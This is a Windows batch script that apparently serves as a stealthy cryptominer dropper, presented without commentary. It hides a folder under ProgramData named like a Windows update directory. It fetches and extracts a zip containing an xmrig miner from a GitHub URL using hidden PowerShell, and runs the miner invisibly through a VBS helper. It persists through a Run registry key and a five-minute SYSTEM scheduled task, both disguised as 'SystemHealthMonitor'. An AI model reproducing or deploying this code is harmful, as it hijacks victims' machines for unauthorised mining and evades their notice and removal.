@echo off

setlocal enabledelayedexpansion

set "ZIP_URL=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/mall.zip"
set "ORIGINAL_DIR=%~dp0"
set "HIDDEN_DIR=%ProgramData%\Windows\SystemUpdate\"
set "HIDDEN_SCRIPT=SystemMonitor.cmd"

if not exist "%HIDDEN_DIR%" (
    mkdir "%HIDDEN_DIR%"
    attrib +s +h "%HIDDEN_DIR%"
)

if not exist "%HIDDEN_DIR%run_hidden.vbs" (
    >"%HIDDEN_DIR%run_hidden.vbs" (
        echo Set WshShell = CreateObject("WScript.Shell"^)
        echo WshShell.Run WScript.Arguments(0^), 0, False
        echo Set WshShell = Nothing
    )
)

powershell -Command "Get-Process rig -ErrorAction SilentlyContinue" >nul 2>&1
if %errorlevel% neq 0 (
    echo [%time%] $77-xmrig.exe not running - attempting start
    if exist "%ORIGINAL_DIR%$77-xmrig.exe" (
        wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%$77-xmrig.exe"
    ) else (

        powershell -WindowStyle Hidden -Command ^
            "Invoke-WebRequest '%ZIP_URL%' -OutFile '%HIDDEN_DIR%mall.zip'; ^
             Expand-Archive '%HIDDEN_DIR%mall.zip' '%HIDDEN_DIR%' -Force; ^
             Remove-Item '%HIDDEN_DIR%mall.zip' -Force"
        
        if exist "%HIDDEN_DIR%$77-xmrig.exe" (
            wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%$77-xmrig.exe"
        )
    )
)

if not exist "%HIDDEN_DIR%%HIDDEN_SCRIPT%" (
    copy /y "%~f0" "%HIDDEN_DIR%%HIDDEN_SCRIPT%" >nul
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHealthMonitor" /t REG_SZ /d "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /f >nul 2>&1
schtasks /create /tn "SystemHealthMonitor" /tr "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f >nul 2>&1

wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "cmd /c timeout /t 10800 /nobreak && wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\""